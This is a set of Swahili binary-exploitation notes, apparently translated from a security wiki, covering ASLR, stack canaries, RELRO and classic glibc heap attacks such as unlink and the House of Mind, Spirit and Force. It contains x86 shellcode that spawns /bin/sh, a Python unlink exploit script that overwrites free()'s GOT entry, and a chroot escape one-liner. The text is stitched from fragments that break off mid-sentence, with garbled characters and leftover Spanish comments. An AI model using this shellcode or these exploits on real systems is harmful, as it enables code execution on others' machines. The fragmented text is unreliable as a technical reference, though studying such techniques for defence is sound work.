Kwa sasa **anwani za kazi** zinazotekelezwa zimefichwa nyuma ya muundo kadhaa na hatimaye anwani ambayo inaelekea sio anwani za kazi, lakini zimefichwa kwa kutumia XOR na displace na **funguo la nasibu**. Kwa hivyo, kwa sasa njia hii ya shambulio sio ya kufaa sana angalau kwenye x86 na x64\_86.\
Kazi ya **ufichaji** ni **`PTR_MANGLE`**. **Miundo mingine** kama m68k, mips32, mips64, aarch64, arm, hppa... **hawatekelezi ufichaji** kwa sababu **inarudisha kitu kile kile** kama ilivyopokea kama kuingia. Kwa hivyo, miundo hii inaweza kushambuliwa kwa njia hii.

### **setjmp() & longjmp()**

{% hint style="danger" %}
Leo ni nadra sana **kutumia hii**.
{% endhint %}

**`Setjmp()`** inaruhusu **kuhifadhi** **muktadha** (registri)\
**`longjmp()`** inaruhusu **kurudisha** **muktadha**.\
**Registri zilizohifadhiwa** ni: `EBX, ESI, EDI, ESP, EIP, EBP`\
Kile kinachotokea ni kwamba EIP na ESP zinapitishwa na **kazi ya `PTR_MANGLE`**, kwa hivyo **muundo unaoweza kushambuliwa na njia hii ni sawa na hapo juu**.\
Ni muhimu kwa urejeshaji wa kosa au kuingiliwa.\
Hata hivyo, kutokana na nilichosoma, registri zingine hazilindwi, **kwa hivyo ikiwa kuna `call ebx`, `call esi` au `call edi`** ndani ya kazi inayoitwa, udhibiti unaweza kuchukuliwa. Au pia unaweza kubadilisha EBP ili kubadilisha ESP.

**VTable na VPTR katika C++**

Kila darasa lina **Vtable** ambayo ni safu ya **pointa kwa njia**.

Kila kitu cha **darasa** kina **VPtr** ambayo ni **pointa** kwa safu ya darasa yake. VPtr ni sehemu ya kichwa cha kila kitu, kwa hivyo ikiwa **ubadilishaji** wa **VPtr** unafanikiwa, inaweza **kubadilishwa** ili **ielekee** kwa njia ya uwongo ili kutekeleza shellcode.

## **Hatua za Kuzuia na Kuepuka**

**ASLR sio kabisa ya nasibu**

PaX inagawanya nafasi ya anwani ya mchakato katika vikundi 3:

Msimbo na data ulioanzishwa na usioanzishwa: .text, .data na .bss ‚Äî> 16bits ya entropy kwenye variable delta\_exec, variable hii inaanzishwa kwa nasibu kwa kila mchakato na inaongezwa kwa anwani za mwanzo

Kumbukumbu iliyotengwa na mmap() na maktaba zinazoshirikiwa ‚Äî> 16bits, delta\_mmap

Stack ‚Äî> 24bits, delta\_stack ‚Äî> Kwa kweli 11 (kutoka byte ya 10 hadi 20 pamoja) ‚Äî> imepangwa kwa 16bytes ‚Äî> anwani halisi za stack 524,288 zinawezekana

Mipangilio ya mazingira na hoja zinahamia kidogo kuliko buffer kwenye stack.

**Return-into-printf**

Ni mbinu ya kubadilisha ujazo wa buffer kuwa kosa la muundo wa string. Inahusisha kubadilisha EIP ili ielekee printf ya kazi na kumpa kama hoja string ya muundo ili kupata thamani juu ya hali ya mchakato.

**Shambulio kwa Maktaba**

Maktaba ziko kwenye anwani na 16bits za nasibu = anwani 65,636 zinawezekana. Ikiwa seva inayoweza kushambuliwa inaita fork(), nafasi ya anwani ya kumbukumbu inafungwa kwenye mchakato wa mtoto na inabaki bila kuguswa. Kwa hivyo, unaweza kujaribu kufanya nguvu ya brute kwa kazi ya usleep() ya libc ukipa "16" kama hoja ili wakati inachukua muda mrefu kuliko kawaida kujibu, kazi hiyo itakuwa imepatikana. Ukiwa na habari ya wapi kazi hiyo iko, unaweza kupata delta\_mmap na kuhesabu zingine.

Njia pekee ya kuwa na uhakika kuwa ASLR inafanya kazi ni kwa kutumia usanifu wa 64bits. Hapo hakuna mashambulizi ya nguvu ya brute.

**StackGuard na StackShield**

**StackGuard** inaingiza kabla ya EIP ‚Äî> 0x000aff0d(null, \n, EndOfFile(EOF), \r) ‚Äî> Bado wana hatari recv(), memcpy(), read(), bcoy() na hailingani na EBP

**StackShield** ni ngumu zaidi kuliko StackGuard

Inahifadhi anwani za kurudi EIP kwenye jedwali (Global Return Stack) ili ujazo wa buffer usilete madhara yoyote. Pia, anwani hizo zinaweza kulinganishwa ili kuona ikiwa kumekuwa na ujazo wa buffer.

Pia unaweza kuthibitisha anwani ya kurudi na thamani ya kikomo, kwa hivyo ikiwa EIP inaenda mahali tofauti na kawaida kama eneo la data, itajulikana. Lakini hii inaweza kuzungukwa na Ret-to-lib, ROPs au ret2ret.

Kama unavyoona, stackshield pia haikingi varibale za ndani.

**Stack Smash Protector (ProPolice) -fstack-protector**

Canary inawekwa kabla ya EBP. Inapanga upya varibale za ndani ili buffers ziwe kwenye nafasi za juu na kwa hivyo haziwezi kusababisha ujazo wa varibale nyingine.

Pia, inafanya nakala salama ya hoja zilizopitishwa juu ya stack (juu ya varibale za ndani) na kutumia nakala hizi kama hoja.

Haiwezi kulinda mizunguko ya chini ya vipengee 8 au buffers ambazo ni sehemu ya muundo wa mtumiaji.

Canary ni nambari ya
### Relro

**Relro (Usanidi wa Kusoma tu)** unaathiri ruhusa za kumbukumbu kama NX. Tofauti ni kwamba wakati NX inafanya stack iweze kutekelezwa, RELRO inafanya **vitu fulani viwe kusoma tu** hivyo hatuwezi kuandika kwenye vitu hivyo. Njia ya kawaida ambayo nimeona hii kuwa kizuizi ni kuzuia sisi kufanya **kuandika juu ya meza ya `got`**, ambayo itajadiliwa baadaye. Meza ya `got` inashikilia anwani za kazi za libc ili programu ijue anwani hizo ni zipi na iweze kuziita. Hebu tuone jinsi ruhusa za kumbukumbu zinavyoonekana kwa kuingia kwenye meza ya `got` kwa programu na bila relro.

Na relro:
```bash
gef‚û§  vmmap
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /tmp/tryc
0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /tmp/tryc
0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /tmp/tryc
0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /tmp/tryc
0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /tmp/tryc
0x0000555555559000 0x000055555557a000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef‚û§  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gef‚û§  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/tryc'(0x555555557000-0x555555558000), permission=r--
0x555555557fd0 - 0x555555557fe8  ‚Üí   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
Bila relro:
```bash
gef‚û§  vmmap
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-- /tmp/try
0x0000000000401000 0x0000000000402000 0x0000000000001000 r-x /tmp/try
0x0000000000402000 0x0000000000403000 0x0000000000002000 r-- /tmp/try
0x0000000000403000 0x0000000000404000 0x0000000000002000 r-- /tmp/try
0x0000000000404000 0x0000000000405000 0x0000000000003000 rw- /tmp/try
0x0000000000405000 0x0000000000426000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef‚û§  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gef‚û§  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/try'(0x404000-0x405000), permission=rw-
0x404018 - 0x404030  ‚Üí   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
Kwa binary **bila relro**, tunaweza kuona kuwa anwani ya kuingia ya `fgets` katika `got` ni `0x404018`. Tukiangalia ramani ya kumbukumbu tunagundua kuwa iko kati ya `0x404000` na `0x405000`, ambayo ina **ruhusa za `rw`**, maana tunaweza kusoma na kuandika kwenye hiyo. Kwa binary **na relro**, tunaona kuwa anwani ya jedwali la `got` kwa kukimbia kwa binary (pie imeamilishwa hivyo anwani hii itabadilika) ni `0x555555557fd0`. Katika ramani ya kumbukumbu ya binary hiyo inaangukia kati ya `0x0000555555557000` na `0x0000555555558000`, ambayo ina **ruhusa ya kumbukumbu `r`**, maana tunaweza tu kusoma kutoka hiyo.

Basi ni **jinsi gani tunaweza kuepuka**? Njia ya kawaida ninayotumia ni kutofanya andika kwenye maeneo ya kumbukumbu ambayo relro inasababisha kuwa ya kusoma tu, na **kupata njia tofauti ya kupata utekelezaji wa nambari**.

Tafadhali kumbuka kuwa ili hii itokee, binary inahitaji kujua kabla ya utekelezaji anwani za kazi zifuatazo:

* Uunganishaji wa uvivu: Anwani ya kazi inatafutwa mara ya kwanza kazi inapoitwa. Kwa hivyo, GOT inahitaji kuwa na ruhusa ya kuandika wakati wa utekelezaji.
* Unganisha sasa: Anwani za kazi zinafumbuliwa mwanzoni mwa utekelezaji, kisha ruhusa ya kusoma tu inatolewa kwa sehemu nyeti kama vile .got, .dtors, .ctors, .dynamic, .jcr. `` `** ``-z relro`**`y`**`-z now\`\*\*

Ili kuchunguza ikiwa programu inatumia Unganisha sasa, unaweza kufanya:
```bash
readelf -l /proc/ID_PROC/exe | grep BIND_NOW
```
Wakati binary inapakia kwenye kumbukumbu na kazi inaitwa kwa mara ya kwanza, inaruka kwenye PLT (Procedure Linkage Table), kutoka hapa inafanya kuruka (jmp) kwenye GOT na kugundua kuwa kuingia hiyo haijasuluhishwa (ina anwani ya kufuata ya PLT). Kwa hivyo inaita Runtime Linker au rtfd ili kusuluhisha anwani na kuihifadhi kwenye GOT.

Wakati kazi inaitwa, inaita PLT, ambayo ina anwani ya GOT ambapo anwani ya kazi imehifadhiwa, kwa hivyo inaelekeza mtiririko huko na hivyo kuita kazi. Walakini, ikiwa ni mara ya kwanza kuita kazi, kile kilicho kwenye GOT ni maagizo inayofuata ya PLT, kwa hivyo mtiririko unaendelea kwenye nambari ya PLT (rtfd) na kugundua anwani ya kazi, kuihifadhi kwenye GOT na kuita.

Wakati binary inapakia kwenye kumbukumbu, compiler amesema wapi offset ya kuweka data ambayo inapaswa kupakia wakati programu inaendeshwa.

Lazy binding -> Anwani ya kazi inatafutwa mara ya kwanza inapoitwa kazi hiyo, kwa hivyo GOT ina ruhusa ya kuandika ili wakati inatafutwa, iweze kuhifadhiwa hapo na sio lazima kutafutwa tena.

Bind now -> Anwani za kazi zinatafutwa wakati programu inapakia na ruhusa za sehemu .got, .dtors, .ctors, .dynamic, .jcr zinabadilishwa kuwa kusoma tu. -z relro na -z now

Hata hivyo, kwa ujumla programu hazijajaa na chaguo hizo, kwa hivyo mashambulizi haya bado yanawezekana.

readelf -l /proc/ID_PROC/exe | grep BIND_NOW -> Ili kujua ikiwa wanatumia BIND NOW

Fortify Source -D_FORTIFY_SOURCE=1 au =2

Jaribu kutambua kazi ambazo zinakili kutoka mahali pa kwanza hadi mahali pa pili kwa njia isiyokuwa salama na ubadilishe kazi hiyo na kazi salama.

Kwa mfano:
char buf[16];
strcpy(buf, source);

Inatambuliwa kuwa sio salama na kwa hivyo inabadilisha strcpy() na __strcpy_chk() kwa kutumia ukubwa wa buffer kama ukubwa wa juu wa nakala.

Tofauti kati ya =1 na =2 ni kwamba:

Ya pili haikubali kwamba %n inatoka kwenye sehemu na ruhusa ya kuandika. Pia, parameter kwa upatikanaji wa moja kwa moja wa hoja inaweza kutumiwa tu ikiwa zimekuwa zikitumiwa hapo awali, yaani, inaweza kutumika tu %3$d ikiwa hapo awali %2$d na %1$d zilitumiwa.

Kuonyesha ujumbe wa kosa hutumia argv[0], kwa hivyo ikiwekwa kwenye anwani nyingine (kama kwenye kumbukumbu ya kawaida) ujumbe wa kosa utaonyesha maudhui ya kumbukumbu hiyo. Ukurasa 191

Kubadilisha Libsafe

Inaamilishwa na: LD_PRELOAD=/lib/libsafe.so.2
au
"/lib/libsave.so.2" > /etc/ld.so.preload

Inachukua wito kwa kazi fulani zisizo salama na kuzibadilisha na zingine salama. Haijatengenezwa kwa viwango. (tu kwa x86, sio kwa ujenzi na -fomit-frame-pointer, sio ujenzi wa static, sio kila kazi inayoweza kudhurika inakuwa salama na LD_PRELOAD haifanyi kazi kwenye binary na suid).

ASCII Armored Address Space

Inahusisha kupakia maktaba za pamoja kutoka 0x00000000 hadi 0x00ffffff ili daima iwe na byte 0x00. Walakini, hii haizuii mashambulizi mengi, haswa katika mfumo wa little endian.

ret2plt

Inahusisha kufanya ROP ili kuita kazi strcpy@plt (kutoka kwa plt) na kuielekeza kwenye kuingia ya GOT na kunakili byte ya kwanza ya kazi ambayo unataka kuita (system()). Kisha unafanya hivyo tena ukiielekeza kwenye GOT+1 na kunakili byte ya pili ya system()... Mwishowe, unaita anwani iliyohifadhiwa kwenye GOT ambayo itakuwa system()

Falso EBP

Kwa kazi ambazo hutumia EBP kama usajili wa kuashiria hoja kwa kubadilisha EIP na kuielekeza kwa system(), lazima pia ubadilishe EBP ili ielekeze kwa eneo la kumbukumbu ambalo lina byte 2 yoyote na kisha anwani ya &"/bin/sh".

Jela na chroot()

debootstrap -arch=i386 hardy /home/user -> Inasakinisha mfumo wa msingi chini ya saraka maalum

Msimamizi anaweza kutokea kwenye jela hizi kwa kufanya: mkdir foo; chroot foo; cd ..

Instrumentation ya namna ya namna

Valgrind -> Inatafuta makosa
Memcheck
RAD (Return Address Defender)
Insure++


8 Heap Overflows: Mbinu za msingi za kudukua

Kipande kilichotengwa

prev_size |
size | -Kichwa
*mem | Data

Kipande cha bure

prev_size |
size |
*fd | Ptr forward chunk
*bk | Ptr back chunk -Kichwa
*mem | Data

Vipande vya bure viko kwenye orodha iliyofungwa mara mbili (bin) na kamwe haiwezi kuwa na vipande viwili vya bure pamoja (vinajumuishwa)

Katika "size" kuna bits za kuonyesha: Ikiwa kipande cha awali kina matumizi, ikiwa kipande kimepewa kwa kutumia mmap() na ikiwa kipande kinahusiana na uwanja wa msingi.

Ikiwa unapofuta kipande, vipande vyovyote vinavyozunguka vinapokuwa huru, hivi vinakusanywa pamoja kupitia macro unlink() na kipande kikubwa zaidi kinapitishwa kwa frontlink() ili kiingize bin sahihi.

unlink(){
BK = P->bk; -> BK ya kipande kipya ni ile ambayo ilikuwa na kipande kilichokuwa huru hapo awali
FD = P->fd; -> FD ya kipande kipya ni ile ambayo ilikuwa na kipande kilichokuwa huru hapo awali
FD->bk = BK; -> BK ya kipande kinachofuata inaelekeza kwa kipande kipya
BK->fd = FD; -> FD ya kipande kilichopita inaelekeza kwa kipande kipya
}

Kwa hivyo, ikiwa tunaweza kubadilisha P->bk na anwani ya shellcode na P->fd na anwani ya kuingia kwenye GOT au DTORS minus 12, tunaweza kufanikisha:

BK = P->bk = &shellcode
FD = P->fd = &__dtor_end__ - 12
FD->bk = BK -> *((&__dtor_end__ - 12) + 12) =
**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<I‚Äù, 0xfffffff0) #Ni muerto, ni libre**

**fake\_size = pack("\<I‚Äù, 0xfffffffc) #-4, para que piense que el ‚Äúsize‚Äù del 3¬∫ trozo est√° 4bytes detr√°s (apunta a prev\_size) pues es ah√≠ donde mira si el 2¬∫ trozo est√° libre**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #Kwenye payload mwanzoni tutaweka byte 8 za kujaza**

**got\_free = pack("\<I", 0x08048300 - 12) #Anwani ya free() kwenye plt-12 (itakuwa anwani itakayobadilishwa ili shellcode iitwe mara ya pili free() inapoitwa)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) #Kama ilivyosemwa, payload inaanza na byte 8 za kujaza**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #Trozo la 2 linabadilishwa, got\_free inaelekeza mahali tutahifadhi anwani ya addr\_sc + 12**

**os.system("./8.3.o " + payload)**

**unset() inafungua kwa kinyume (wargame)**

Tunadhibiti vipande 3 vya kumbukumbu vinavyofuata na vinawekwa huru kwa utaratibu uliopindishwa.

Katika kesi hii:

Katika kipande c, tunaweka shellcode

Tunatumia kipande a kusuluhisha b ili ukubwa uwe na biti ya PREV\_INUSE iliyozimwa ili iweze kufikiri kuwa kipande a ni huru.

Pia, tunasuluhisha ukubwa wa kichwa cha b ili iwe -4.

Kwa hivyo, programu itafikiri "a" ni huru na kwenye bin, kwa hivyo itaita unlink() kuiondoa. Walakini, kwa kuwa kichwa cha PREV\_SIZE ni -4. Itafikiri kuwa kipande cha "a" kwa kweli kinaanza kwenye b+4. Yaani, itafanya unlink() kwa kipande kinachoanza kwenye b+4, kwa hivyo kwenye b+12 kutakuwa na pointer "fd" na kwenye b+16 kutakuwa na pointer "bk".

Kwa njia hii, ikiwa tunaweka anwani ya shellcode kwenye bk na anwani ya kazi ya "puts()"-12 kwenye fd, tunapata payload yetu.

**Tekniki ya Frontlink**

Frontlink inaitwa wakati kitu kinapofutwa na hakuna vipande vyake vya jirani vilivyofutwa, unlink() haipigiwi simu moja kwa moja, badala yake frontlink() inaitwa moja kwa moja.

Hitilafu inayofaa wakati malloc inayoshambuliwa haijawahi kuachiliwa (free()).

Inahitaji:

Kiwango kinachoweza kujaa na kazi ya kuingiza data

Kiwango kinachopakana na hicho ambacho kinapaswa kuachiliwa na ambacho kinabadilishwa shamba la fd la kichwa chake kwa sababu ya kujaa kwa kiwango kilichotangulia

Kiwango cha kuachiliwa na ukubwa mkubwa kuliko 512 lakini ndogo kuliko kiwango kilichotangulia

Kiwango kilichotangulia kabla ya hatua ya 3 ambayo inaruhusu kusuluhisha prev\_size yake

Kwa njia hii, kwa kusuluhisha kwenye mallocs mbili kwa njia isiyodhibitiwa na moja kwa njia iliyodhibitiwa lakini inayofutwa tu, tunaweza kufanya shambulio.

**Double free() vulnerability**

Ikiwa free() inaitwa mara mbili na pointer sawa, kuna bins mbili zinazoashiria anwani ile ile.

Ikiwa tunataka kutumia moja tena, itapewa bila shida. Ikiwa tunataka kutumia nyingine, itapewa nafasi hiyo hiyo, kwa hivyo tutakuwa na pointers "fd" na "bk" zilizopotoshwa na data ambayo itaandika akiba ya awali.

**Baada ya free()**

Pointer iliyotolewa hapo awali inatumika tena bila kudhibitiwa.

## **8 Heap Overflows: Exploits za juu**

Tekniki za Unlink() na FrontLink() ziliondolewa kwa kubadilisha kazi ya unlink().

**The house of mind**

Inahitaji wito mmoja tu wa free() kuchochea utekelezaji wa nambari isiyojulikana. Inafaa kutafuta kipande cha pili ambacho kinaweza kujaa na kipande cha awali na kuachiliwa.

Wito mmoja wa free() husababisha wito wa public\_fREe(mem), ambayo inafanya:

mstate ar\_ptr;

mchunkptr p;

‚Ä¶

p = mem2chunk(mes); ‚Äî> Inarudisha pointer kwa anwani ambapo kipande kinaanza (mem-8)

‚Ä¶

ar\_ptr = arena\_for\_chunk(p); ‚Äî> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

‚Ä¶

\_int\_free(ar\_ptr, mem);

}

Katika \[1] inathibitisha shamba la ukubwa la biti NON\_MAIN\_ARENA, ambayo inaweza kubadilishwa ili uthibitisho uweze kurudi kweli na kutekeleza heap\_for\_ptr() ambayo inafanya and kwa "mem" na kuacha 2.5 byte zisizo muhimu (katika kesi yetu ya 0x0804a000 inaacha 0x08000000) na kufikia 0x08000000->ar\_ptr (kama vile ni muundo wa struct heap\_info)

Kwa njia hii, ikiwa tunaweza kudhibiti kipande kwa mfano kwenye 0x0804a000 na kipande kitafutwa kwenye **0x081002a0** tunaweza kufikia anwani ya 0x08100000 na kuandika chochote tunachotaka, kwa mfano **0x0804a000**. Wakati kipande cha pili kitakapofutwa, kitagundua kuwa heap\_for\_ptr(ptr)->ar\_ptr inarudisha kile tulichoandika kwenye 0x08100000 (kwa sababu inatumia and kwa 0x081002a0 ambayo tuliona hapo awali na kutoka hapo inachukua thamani ya byte 4 za kwanza, ar\_ptr)

Kwa njia hii, wito wa \_int\_free(ar\_ptr, mem) utaitwa, yaani **\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void\_t\* mem){**\
‚Ä¶\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

Kama tulivyoona hapo awali, tunaweza kudhibiti thamani ya av, kwa hivyo ni kile tunachoandika kwenye kipande
T√©knikia hii haifai tena kwa sababu ilipata marekebisho sawa na unlink. Inalinganisha ikiwa tovuti mpya inayolengwa pia inamlenga.

**Fastbin**

Ni toleo la The house of mind

Tunataka kutekeleza msimbo ufuatao ambao unafikiwa baada ya ukaguzi wa kwanza wa kazi \_int\_free()

fb = &(av->fastbins\[fastbin\_index(size)] ‚Äî> Ikiwa fastbin\_index(sz) ‚Äî> (sz >> 3) - 2

‚Ä¶

p->fd = \*fb

\*fb = p

Kwa njia hii, ikiwa inawekwa kwenye "fb" inatoa anwani ya kazi kwenye GOT, anwani hii itawekwa kwenye kipande kilichobadilishwa. Kwa hili, ni muhimu kuwa uwanja uko karibu na anwani za dtors. Hasa, av->max\_fast inapaswa kuwa kwenye anwani ambayo tunataka kubadilisha.

Kwa kuwa na The House of Mind tuliona kuwa tunadhibiti nafasi ya av.

Kwa hivyo, ikiwekwa kwenye uwanja wa ukubwa wa 8 + NON\_MAIN\_ARENA + PREV\_INUSE ‚Äî> fastbin\_index() itatupa fastbins\[-1\], ambayo itaelekeza kwa av->max\_fast

Katika kesi hii, av->max\_fast itakuwa anwani ambayo itabadilishwa (sio anwani inayolengwa, lakini nafasi hiyo ndiyo itabadilishwa).

Pia, lazima iwe kwamba kipande kinachofuata baada ya kuachiliwa kiwe kikubwa kuliko 8 -> Kwa kuwa tumesema kuwa ukubwa wa kipande kilichofunguliwa ni 8, katika kipande hiki bandia tunahitaji tu kuweka ukubwa mkubwa kuliko 8 (kwa kuongezea, shellcode itakuwa kwenye kipande kilichofunguliwa, lazima tuweke jmp mwanzoni ambayo itaanguka kwenye nops).

Pia, kipande bandia hicho hicho lazima kiwe kidogo kuliko av->system\_mem. av->system\_mem iko 1848 bytes mbali.

Kwa sababu ya nulls za \_DTOR\_END\_ na anwani chache kwenye GOT, hakuna anwani kutoka sehemu hizi zinazofaa kubadilishwa, kwa hivyo hebu tuone jinsi ya kutumia fastbin kushambulia stack.

Njia nyingine ya shambulio ni kuelekeza **av** kwa stack.

Ikiwa tunabadilisha ukubwa ili iwe 16 badala ya 8 basi: fastbin\_index() itatupa fastbins\[0\] na tunaweza kutumia hii kubadilisha stack.

Kwa hili, hakuna canary au thamani za ajabu kwenye stack, kwa kweli tunahitaji kuwa katika hali hii: 4bytes za null + EBP + RET

4 bytes za null zinahitajika kwa sababu **av** itakuwa kwenye anwani hii na kipengee cha kwanza cha **av** ni mutex ambayo lazima iwe 0.

**av->max\_fast** itakuwa EBP na itakuwa thamani ambayo itatusaidia kuepuka vizuizi.

Katika **av->fastbins\[0\]** itabadilishwa na anwani ya **p** na itakuwa RET, kwa hivyo itaruka kwenye shellcode.

Pia, katika **av->system\_mem** (1484bytes juu ya nafasi kwenye stack) kutakuwa na takataka nyingi ambazo zitaruhusu kuepuka ukaguzi unaofanywa.

Pia, kipande kinachofuata baada ya kuachiliwa kiwe kikubwa kuliko 8 -> Kwa kuwa tumesema kuwa ukubwa wa kipande kilichofunguliwa ni 16, katika kipande hiki bandia tunahitaji tu kuweka ukubwa mkubwa kuliko 8 (kwa kuongezea, shellcode itakuwa kwenye kipande kilichofunguliwa, lazima tuweke jmp mwanzoni ambayo itaanguka kwenye nops zinazofuata baada ya uga wa ukubwa wa kipande kipya bandia).

**The House of Spirit**

Katika kesi hii, tunatafuta kuwa na pointer kwa malloc ambayo inaweza kubadilishwa na mshambuliaji (kwa mfano, pointer iko kwenye stack chini ya uwezekano wa kujaa kwa kipekee).

Kwa hivyo, tunaweza kufanya pointer huyu kuashiria popote. Walakini, sio kila mahali ni sahihi, ukubwa wa kipande bandia lazima uwe mdogo kuliko av->max\_fast na haswa sawa na ukubwa ulioombwa katika wito wa baadaye wa malloc()+8. Kwa hivyo, ikiwa tunajua kuwa baada ya pointer huyu wenye udhaifu kuna wito wa malloc(40), ukubwa wa kipande bandia lazima uwe sawa na 48.

Kwa mfano, ikiwa programu inauliza mtumiaji kwa nambari tunaweza kuingiza 48 na kuashiria pointer ya malloc inayoweza kubadilishwa kwa byte 4 inayofuata (ambayo inaweza kuwa EBP kwa bahati nzuri, kwa hivyo 48 iko nyuma, kama kichwa cha ukubwa). Kwa kuongezea, anwani ya ptr-4+48 lazima itimize masharti kadhaa (katika kesi hii ptr=EBP), yaani, 8 < ptr-4+48 < av->system\_mem.

Ikiwa hii inatimizwa, wakati wito wa malloc unaofuata ambao tulisema ni malloc(40) unaitwa, anwani ya EBP itapewa kama anwani. Ikiwa mshambuliaji pia anaweza kudhibiti kile kinachoandikwa kwenye malloc hii, anaweza kubadilisha EBP na EIP na anwani anayotaka.

Nadhani hii ni kwa sababu wakati free() inaitwa, inahifadhi kuwa kuna kipande cha ukubwa kamili kwa malloc() mpya ambayo inataka kuhifadhi, kwa hivyo inampa anwani hiyo.

**The House of Force**

Inahitajika:

* Kujaa kwa kipande ambacho kinaweza kubadilisha wilderness
* Wito wa malloc() na ukubwa uliowekwa na mtumiaji
* Wito wa malloc() ambao data inaweza kuwekwa na mtumiaji

Jambo la kwanza linalofanywa ni kubadilisha ukubwa wa kipande cha wilderness na thamani kubwa sana (0xffffffff), kwa hivyo ombi lolote la kumbukumbu kubwa ya kutosha litashughulikiwa katika \_int\_malloc() bila haja ya kupanua heap

Jambo la pili ni kubadilisha av->top ili iashirie eneo la kumbukumbu chini ya udhibiti wa mshambuliaji, kama stack. Katika av->top, tunaweka \&EIP - 8.

Tunahitaji kubadilisha av->top ili iashirie eneo la kumbukumbu chini ya udhibiti wa mshambuliaji:

victim = av->top;

remainder = chunck\_at\_offset(victim, nb);

av->top = remainder;

Victim inachukua thamani ya anwani ya kipande cha wilderness cha s
**Kuweka akiba mbili za malloc**, ili kwanza iweze kujaa baada ya ya pili kuachiliwa na kuingizwa kwenye bin yake (yaani, malloc kubwa kuliko kipande cha pili kabla ya kujaa).

